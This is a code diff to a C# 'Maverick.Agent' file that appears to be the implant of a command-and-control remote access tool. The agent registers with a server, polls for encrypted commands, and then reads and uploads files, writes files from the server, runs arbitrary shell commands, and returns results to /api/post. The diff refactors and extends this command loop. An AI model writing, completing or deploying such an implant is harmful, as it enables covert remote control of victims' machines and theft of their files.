@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Net;
 using System.Net.Sockets;
+using System.Security.AccessControl;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -49,13 +50,16 @@ namespace Maverick.Agent
             return Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(info));
         }
 
-        private static byte[] GenerateResponseCommand(CommandTypes type, byte[] Data)
+        private static byte[] GenerateResponseCommand(CommandRequestModel cmd, byte[] Data, FileUploadModel file)
         {
             CommandRequestModel command = new CommandRequestModel
             {
                 InternalID = InternalID,
-                ActionType = type,
+                ActionType = cmd.ActionType,
                 Data = Data,
+                FileUpload = file,
+                Command = cmd.Command,
+                CommandID = cmd.CommandID,
             };
             return Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(command));
         }
@@ -65,16 +69,15 @@ namespace Maverick.Agent
             if (!isRegistry)
             {
                 //do registry
-                var info = GenerateClientInfoPayload();
-                var encryptData = await CryptoFunction.EncryptAESPayload(info);
-                var result = await TrafficFunction.SendDataAsync(BaseURL + "/api/new", encryptData);
-                if (result == null) return;
-                var responseString = Encoding.UTF8.GetString(result);
-                if (InternalID == 0)
+                var payload = await CryptoFunction.EncryptAESPayload(GenerateClientInfoPayload());
+                var response = await TrafficFunction.SendDataAsync(BaseURL + "/api/new", payload);
+                if (response == null) return;
+                if (int.TryParse(Encoding.UTF8.GetString(response), out int newID))
                 {
-                     if (int.TryParse(responseString, out InternalID))
-                        isRegistry = true;
+                    InternalID = newID;
+                    isRegistry = true;
                 }
+                return;
             }
             
             var newCommand = await TrafficFunction.SendDataAsync(BaseURL + "/api/get", BitConverter.GetBytes(InternalID));
@@ -87,50 +90,56 @@ namespace Maverick.Agent
                     {
                         if (result == 0xffffffff)
                         {
+                            InternalID = 0;
                             isRegistry = false;
+                            return;
+                        }
+                        if (result == 0) //mostly not called, mean client send not a valid integer InternalID
+                        {
                             return;
                         }
                     }
                 }
                 catch { }
-                var Command = System.Text.Json.JsonSerializer.Deserialize<CommandRequestModel>(newCommand);
+                var rawData = await CryptoFunction.DecryptAESPayload(newCommand);
+                var Command = System.Text.Json.JsonSerializer.Deserialize<CommandRequestModel>(rawData);
                 switch (Command.ActionType)
                 {
-                    case CommandTypes.INFOCLIENT:
+                    case "INFOCLIENT":
                         {
                             var infoData = GenerateClientInfoPayload();
                             var encryptData = await CryptoFunction.EncryptAESPayload(infoData);
                             await TrafficFunction.SendDataAsync(BaseURL + "/api/post", encryptData);
                             break;
                         }
-                    case CommandTypes.GETFILE:
+                    case "GETFILE":
                         {
                             var fileData = ActionFunction.PerformReadFile(Command.Command);
-                            var toSend = GenerateResponseCommand(CommandTypes.GETFILE, fileData);
+                            var toSend = GenerateResponseCommand(Command, null, fileData);
                             var encryptData = await CryptoFunction.EncryptAESPayload(toSend);
                             await TrafficFunction.SendDataAsync(BaseURL + "/api/post", encryptData);
                             break;
                         }
-                    case CommandTypes.SENDFILE:
+                    case "SENDFILE":
                         {
                             var success = ActionFunction.PerformWriteFile(Command.Command, Command.Data);
                             var response = Encoding.UTF8.GetBytes(success ? "Ok" : "");
-                            var toSend = GenerateResponseCommand(CommandTypes.SENDFILE, response);
+                            var toSend = GenerateResponseCommand(Command, response, null);
                             var encryptData = await CryptoFunction.EncryptAESPayload(toSend);
                             await TrafficFunction.SendDataAsync(BaseURL + "/api/post", encryptData);
                             break;
                         }
-                    case CommandTypes.DOCOMMAND:
+                    case "DOCOMMAND":
                         {
                             var output = ActionFunction.PerformDoCommand(Command.Command);
-                            var toSend = GenerateResponseCommand(CommandTypes.DOCOMMAND, output);
+                            var toSend = GenerateResponseCommand(Command, output, null);
                             var encryptData = await CryptoFunction.EncryptAESPayload(toSend);
                             await TrafficFunction.SendDataAsync(BaseURL + "/api/post", encryptData);
                             break;
                         }
-                    case CommandTypes.KILLAPPLICATION:
+                    case "KILLAPPLICATION":
                         {
-                            var toSend = GenerateResponseCommand(CommandTypes.KILLAPPLICATION, Encoding.UTF8.GetBytes("Ok"));
+                            var toSend = GenerateResponseCommand(Command, Encoding.UTF8.GetBytes("Ok"), null);
                             var encryptData = await CryptoFunction.EncryptAESPayload(toSend);
                             await TrafficFunction.SendDataAsync(BaseURL + "/api/post", encryptData);
                             ActionFunction.PerformKillSystem();
